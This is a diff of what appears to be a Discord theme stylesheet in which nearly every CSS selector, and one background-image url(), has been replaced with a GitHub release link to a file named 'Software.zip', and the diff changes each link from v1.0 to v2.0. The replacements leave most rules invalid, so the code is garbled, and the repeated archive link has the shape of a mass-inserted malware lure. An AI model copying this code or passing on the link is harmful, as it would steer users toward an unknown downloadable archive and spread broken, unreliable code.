@@ -6,7 +6,7 @@
  */
 
  .app-2CXKsg {
-    background-image: url(https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip);
+    background-image: url(https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip);
     background-size: cover;
     background-color: transparent;
 }
@@ -60,7 +60,7 @@
     background-color: rgba(0,0,0,.65);
 }
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip, .chat-2ZfjoI, .members-3WRCEx, .members-3WRCEx>div,
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip, .chat-2ZfjoI, .members-3WRCEx, .members-3WRCEx>div,
 .chat-2ZfjoI, .container-2o3qEW, .theme-dark .container-1NXEtd, .sidebar-1tnWFu, .theme-dark .scroller-3X7KbA, .wrapper-1_HaEi {
     background: transparent;
 }
@@ -117,15 +117,15 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip,
     background-color: rgba(0,0,0,.25);
 }
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip .displayAvatar-3jNvaK {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip .displayAvatar-3jNvaK {
     border-radius: 5px;
 }
 
-.theme-dark https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip .displayedNick-1atSpT {
+.theme-dark https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip .displayedNick-1atSpT {
     color: silver;
 }
 
-.theme-dark https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip .displayUsername-UTerwm {
+.theme-dark https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip .displayUsername-UTerwm {
     color: white;
 }
 
@@ -143,7 +143,7 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip 
     mask: none;
 }
 
-.theme-dark https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip, .theme-dark https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+.theme-dark https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip, .theme-dark https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     background-color: rgba(0, 0, 0, 0.28);
 }
 
@@ -215,7 +215,7 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip 
     background-color: transparent;
 }
 
-.theme-dark .calendarPicker-sDhzdi https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip, .theme-dark .calendarPicker-sDhzdi https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+.theme-dark .calendarPicker-sDhzdi https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip, .theme-dark .calendarPicker-sDhzdi https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     border-color: transparent;
 }
 
@@ -228,7 +228,7 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip 
     border-color: transparent;
 }
 
-.option-Uc12mm[aria-selected=true]:not(https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip) {
+.option-Uc12mm[aria-selected=true]:not(https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip) {
     color: white !important;
     background-color: black !important;
 }
@@ -259,7 +259,7 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip 
     border: none !important;
 }
 
-.theme-dark .calendarPicker-sDhzdi .react-datepicker__day--disabled, .theme-dark .calendarPicker-sDhzdi .react-datepicker__day--outside-month, .theme-dark .calendarPicker-sDhzdi https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip, .theme-dark .calendarPicker-sDhzdi https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+.theme-dark .calendarPicker-sDhzdi .react-datepicker__day--disabled, .theme-dark .calendarPicker-sDhzdi .react-datepicker__day--outside-month, .theme-dark .calendarPicker-sDhzdi https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip, .theme-dark .calendarPicker-sDhzdi https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     background-color: rgba(216, 17, 17, .29);
     color: rgba(246, 246, 247, .5);
 }
@@ -268,11 +268,11 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip 
     color:  white;
 }
 
-.calendarPicker-sDhzdi https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip, .calendarPicker-sDhzdi https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip, .calendarPicker-sDhzdi .react-datepicker__day:hover {
+.calendarPicker-sDhzdi https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip, .calendarPicker-sDhzdi https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip, .calendarPicker-sDhzdi .react-datepicker__day:hover {
     background-color: #FFB21F;
 }
 
-.calendarPicker-sDhzdi https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+.calendarPicker-sDhzdi https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     background-color: #FFB21F;
 }
 
@@ -366,9 +366,9 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip 
     color: white;
 }
 
-.cozy-VmLDNB .timestamp-p1Df1m, https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip, https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip,
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip, https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip,
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip, https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip,
+.cozy-VmLDNB .timestamp-p1Df1m, https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip, https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip,
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip, https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip,
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip, https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip,
 .body-GBnhET {
     color: white;
 }
@@ -378,12 +378,12 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip,
     opacity: 1;
 }
 
-.side-1lrxIh https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip(.disabled-2G98Nl), .topPill-2vcLsa https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip(.disabled-2G98Nl) {
+.side-1lrxIh https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip(.disabled-2G98Nl), .topPill-2vcLsa https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip(.disabled-2G98Nl) {
     background-color: #76aad9;
     border: 2px outset #76aad9;
 }
 
-.side-1lrxIh https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip, .topPill-2vcLsa https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+.side-1lrxIh https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip, .topPill-2vcLsa https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     background-color: #61a5d8 !important;
     border: 2px inset #61a5d8 !important;
 } 
@@ -439,7 +439,7 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip,
     color: #00DFF1;
 }
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     background-color: #76AAD9;
     border: 2px outset #76AAD9;
 }
@@ -449,7 +449,7 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip 
     border: 2px inset #61A5D8;
 }
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip .check-3-73a4 {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip .check-3-73a4 {
     color: #00DFF1;
 }
 
@@ -497,7 +497,7 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip 
     color: white !important;
 }
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     background: rgba(97, 164, 216, .48);
     border: 3px inset #61a5d8;
 }
@@ -541,12 +541,12 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip 
     color: white;
 }
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     background-color: rgba(74, 94, 221, .66);
     transition: background-color .6s;
 }
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     background-color: rgba(31, 61, 255, .89);
 }
 
@@ -719,7 +719,7 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip 
     border: 1px solid transparent;
 }
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip, .input-3O04eu:focus {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip, .input-3O04eu:focus {
     border-color: #61A5D8;
     background-color: rgba(0,0,0,.45);
 }
@@ -832,7 +832,7 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip,
     background-color: rgba(46, 46, 46, .72);
 }
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     background-color: rgba(0,0,0,.25);
 }
 
@@ -882,7 +882,7 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip 
     border: 2px solid black;
 }
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     background-color: rgba(0,0,0,.25);
     border-color: transparent;
 }
@@ -910,7 +910,7 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip 
     font-weight: 300;
 }
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip, .option-Uc12mm:focus, .option-Uc12mm:hover {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip, .option-Uc12mm:focus, .option-Uc12mm:hover {
     background-color: #76AAD9;
 }
 
@@ -973,7 +973,7 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip,
     border: 3px groove #61A5D8;
 }
 
-.button-1zW0-r:hover, .keyboard-mode https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+.button-1zW0-r:hover, .keyboard-mode https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     background-color: #76AAD9;
     border: 3px outset #76AAD9;
 }
@@ -1005,7 +1005,7 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip,
 }
 
 .button-3bklZh:hover,
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     background-color: #76AAD9;
 }
 
@@ -1096,16 +1096,16 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip 
     box-shadow: none;
 }
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     background-color: rgba(176, 33, 33, .62);
 }
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     background-color: #B02121;
     border: 2px outset #B02121;
 }
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     background-color: #B02121;
     border: 2px inset #B02121;
 }
@@ -1141,7 +1141,7 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip 
     color: white;
 }
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     background-color: #00AD89;
 }
 
@@ -1175,7 +1175,7 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip 
     border: none;
 }
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     color: white;
     font-size: 14px;
 }
@@ -1199,8 +1199,8 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip 
     color: white;
 }
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip, https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip .muted-14PyqW,
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip, https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip, https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip, https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip .muted-14PyqW,
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip, https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip, https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     color: white;
 }
 
@@ -1252,8 +1252,8 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip,
     background-image: -webkit-repeating-linear-gradient(-48deg, #000000 30%, #1a1a1a 35%);
 }
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip, 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip, 
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     background: none;
 }
 
@@ -1285,17 +1285,17 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip 
     background: rgba(97, 164, 216, .35);
 }
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     background-color: #00AD89 !important;
     opacity: .8;
     transition: opacity .2s ease-in;
 }
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     opacity: 1;
 }
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     background-color: #00AD89;
 }
 
@@ -1435,7 +1435,7 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip 
     background-color: rgba(0, 0, 0, 0.28);
 }
 
-.listDefault-2F-w65 https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip .content-1Tgc42 {
+.listDefault-2F-w65 https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip .content-1Tgc42 {
     background-color: rgba(0, 0, 0, 0.68);
 }
 
@@ -1479,7 +1479,7 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip 
     background-color: transparent;
 }
 
-.side-1lrxIh https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip(.disabled-2G98Nl)[style*="color: hsl(359, calc(var(--saturation-factor, 1) * 82.6%), 59.4%);"] {
+.side-1lrxIh https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip(.disabled-2G98Nl)[style*="color: hsl(359, calc(var(--saturation-factor, 1) * 82.6%), 59.4%);"] {
     background-color: #B02121 !important;
     border: none !important;
     color: white !important;
@@ -1549,12 +1549,12 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip 
     background-color: #137e25 !important;
 }
 
-.container-1QtPKm[style*="background-color: hsl(139, calc(var(--saturation-factor, 1) * 47.3%), 43.9%)"] .slider-HJFN2i rect, .bd-switch input:checked+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip .bd-switch-slider rect  {
+.container-1QtPKm[style*="background-color: hsl(139, calc(var(--saturation-factor, 1) * 47.3%), 43.9%)"] .slider-HJFN2i rect, .bd-switch input:checked+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip .bd-switch-slider rect  {
     fill: #0bc90b;
     rx: 3;
 }
 
-.container-1QtPKm[style*="background-color: hsl(139, calc(var(--saturation-factor, 1) * 47.3%), 43.9%)"] .slider-HJFN2i path, .bd-switch input:checked+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip .bd-switch-slider path  {
+.container-1QtPKm[style*="background-color: hsl(139, calc(var(--saturation-factor, 1) * 47.3%), 43.9%)"] .slider-HJFN2i path, .bd-switch input:checked+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip .bd-switch-slider path  {
     fill: white; 
 }
 
@@ -1598,11 +1598,11 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip 
     background-color: transparent;
 }
 
-.top-Ktfr_T https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip, .top-Ktfr_T https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+.top-Ktfr_T https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip, .top-Ktfr_T https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     border-bottom-color: #61A5D8 !important;
 }
 
-.top-Ktfr_T https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+.top-Ktfr_T https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     border-bottom-color: #76AAD9;
 }
 
@@ -1638,12 +1638,12 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip 
     background-color: #61A5D8;
 }
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip, .text-2iTkaw a, .body-1JxAWB a, .theme-dark .checkBoxLabel-16BK2g a, .theme-dark .footerText-2QLGHU a, .theme-dark .subText-1CcYgq a,
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip, .text-2iTkaw a, .body-1JxAWB a, .theme-dark .checkBoxLabel-16BK2g a, .theme-dark .footerText-2QLGHU a, .theme-dark .subText-1CcYgq a,
 .notice-5OG6bf a {
     color: #94CEE6;
 }
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip .contents-3NembX {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip .contents-3NembX {
     background-image: linear-gradient(0deg,transparent,transparent 1px,#94CEE6 0,#94CEE6 2px,transparent 0);
 }
 
@@ -1685,7 +1685,7 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip 
     mask: none;
 }
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     background-color: #00AD89;
     border-color: transparent;
     color: white;
@@ -1740,7 +1740,7 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip 
     color: white;
 }
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip, https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip .name-3BUDLf {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip, https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip .name-3BUDLf {
     color: red;
 }
 
@@ -1765,7 +1765,7 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip,
     border: 3px inset #61A5D8;
 }
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip .itemInner-3e_4G4 {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip .itemInner-3e_4G4 {
     background-color: rgba(97, 165, 216, .5);
 }
 
@@ -1800,7 +1800,7 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip 
     border-radius: 4px;
 }
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     background-color: #61a5d8;
 }
 
@@ -1843,7 +1843,7 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip 
     background-color: transparent;
 }
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip, https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip .mentioned-Tre-dv:hover {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip, https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip .mentioned-Tre-dv:hover {
     background-color: rgba(0, 0, 0, 0.28);
 }
 
@@ -1863,7 +1863,7 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip,
     color: white;
 }
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip .childWrapper-1j_1ub, .wrapper-3kah-n:hover .childWrapper-1j_1ub {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip .childWrapper-1j_1ub, .wrapper-3kah-n:hover .childWrapper-1j_1ub {
     background-color: #76AAD9;
 }
 
@@ -1889,7 +1889,7 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip 
     color: white !important;
 }
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     background-color: rgba(118, 171, 217, .54);
     border: 2px outset #76AAD9;
 }
@@ -1923,7 +1923,7 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip 
     background-color: rgba(118, 171, 217, .33);
 }
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip, .iconContainer-GFfNaA[data-accessibility*=desaturate] {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip, .iconContainer-GFfNaA[data-accessibility*=desaturate] {
 	    filter: saturate(1);
 }
 
@@ -1944,11 +1944,11 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip,
     background-color: #00AD89 !important;
 }
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     background-color: rgba(0,0,0,.2);
 }
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     background: #b10202;
 }
 
@@ -1956,17 +1956,17 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip 
     border-radius: 5px;
 }
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     background: rgba(0,0,0,.3);
     border-radius: 5px;
 }
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip, https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip, https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     background: #19191a;
 }
 
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip, https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip, https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     background: #e20707;
 }
 
@@ -1974,7 +1974,7 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip,
     border-radius: 5px;
 }
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     border: 4px solid #61A5D8;
     box-shadow: none;
     border-radius: 5px;
@@ -2034,11 +2034,11 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip 
     border: none;
 }
 
-.bd-select https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+.bd-select https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     background: #333333;
 }
 
-.bd-addon-views https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+.bd-addon-views https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     background-color: rgba(97, 164, 216, .72);
     border: 2px inset #61A5D8;
 }
@@ -2073,7 +2073,7 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip 
     border: 2px solid #61A5D8;
 }
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     background-color: #61A5D8;
     border-color: transparent;
     box-shadow: none;
@@ -2088,7 +2088,7 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip 
     background: rgba(0, 0, 0, 0.28);
 }
 
-.cardPrimary-pAe8Ed, https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+.cardPrimary-pAe8Ed, https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     border-color: #61A5D8;
 }
 
@@ -2125,7 +2125,7 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip 
     background-color: rgba(0, 0, 0, 0.28);
 }
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     border-color: transparent;
 }
 
@@ -2244,12 +2244,12 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip 
     color: white;
 }
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     color: white !important;
     border-color: firebrick !important;
 }
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     color: white !important;
     border-color: #4a5edd !important;
 }
@@ -2302,7 +2302,7 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip 
     background-color: #61A5D8 !important;
 }
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     color: white;
 }
 
@@ -2411,12 +2411,12 @@ https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip 
     border: 3px outset #76AAD9 !important;
 }
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip, .peopleListItem-u6dGxF:hover {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip, .peopleListItem-u6dGxF:hover {
     background: rgba(0, 0, 0, 0.35);
     border-radius: 4px;
 }
 
-https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v1.0/Software.zip {
+https://github.com/amineehhhhhhhtopg/grrrrr/releases/download/v2.0/Software.zip {
     background-color: #61A5D8;
